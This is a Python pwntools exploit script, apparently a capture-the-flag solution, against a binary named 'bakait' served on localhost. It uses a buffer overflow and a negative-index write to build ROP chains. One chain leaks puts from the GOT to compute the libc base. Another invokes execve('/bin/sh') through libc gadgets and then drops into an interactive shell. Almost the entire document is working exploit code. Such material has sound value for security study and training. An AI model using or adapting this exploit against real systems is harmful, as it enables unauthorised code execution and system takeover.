#!/usr/bin/env python3
# $ pwn template --host localhost --port 2568 ./bakait
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'bakait')
context.terminal = "/home/royalgamer/.local/src/st/st"

host = args.HOST or 'localhost'
port = int(args.PORT or 2568)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

chaosaddr = (str(int("401192",16))).encode()
# 0x00000000004011d2 : mov rdi, rbp ; ret
# 0x000000000040116d : pop rbp ; ret
# 0x0000000000401016 : add rsp, 8 ; ret

poprbp = p64(0x040116d)
movrdi = p64(0x0040118b)
putsplt = p64(0x0401030)
putsgot = p64(0x0404000)
addrsp = p64(0x0401016)
retadr = p64(0x0040101a)

io.recvline()
io.recvline()
io.recvline()
io.recvuntil(b": ")
payload =b"x"*161
io.sendline(payload)
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline(chaosaddr)


io.recvline()
io.recvuntil(b": ")
payload = ((b"x"*8)+ poprbp + putsgot + movrdi +putsplt +retadr+ p64(0x401192) + b"x"*200)[:161]
io.sendline(payload)
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))


io.recvline()
io.recvuntil(b": ")
payload = b"x"*152 + addrsp
io.sendline(payload)
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))

io.recvline()
io.recvuntil(b": ")
io.sendline(b"Hooray")
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))

putsadr = u64(((((io.recvline())).strip(b"\n"))+b"\x00"*8)[:8])
log.info(f"We got puts adr {hex(putsadr)}")
# 0000000000087bd0 <_IO_puts>:
libcbase =  putsadr - 0x0087bd0

io.recvline()
io.recvuntil(b": ")
io.sendline(b"x"*160)
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))

# 908  0x001cb42f 0x001cb42f 7   8    .rodata      ascii   /bin/sh
# 0x000000000010f75b : pop rdi ; ret
# 0x00000000000dd237 : pop rax ; ret
# 0x0000000000110a4d : pop rsi ; ret
# 0x00000000000288b5 : syscall
# 0000000000087bd0 <_IO_puts>:



poprsi = p64(0x0110a4d+libcbase)
binsh = p64(0x01cb42f+libcbase)
poprdi = p64(0x010f75b +libcbase)
poprax = p64(0x00dd237+libcbase)
# poprdx = p64(0x010bf1e+libcbase)
syscall = p64(0x0288b5+libcbase)

io.recvline()
io.recvuntil(b": ")
payload = ((b"x"*8)+ poprdi + binsh + poprsi +p64(0)+poprax + p64(0x3b)+syscall+ b"x"*400)[:161]
io.sendline(payload)
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))


io.recvline()
io.recvuntil(b": ")
payload = b"x"*152 + addrsp
io.sendline(payload)
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))

io.recvline()
io.recvuntil(b": ")
io.sendline(b"Hooray")
io.recvuntil(b": ")
io.sendline(b"-19")
io.recvuntil(b": ")
io.sendline((chaosaddr))


io.interactive()

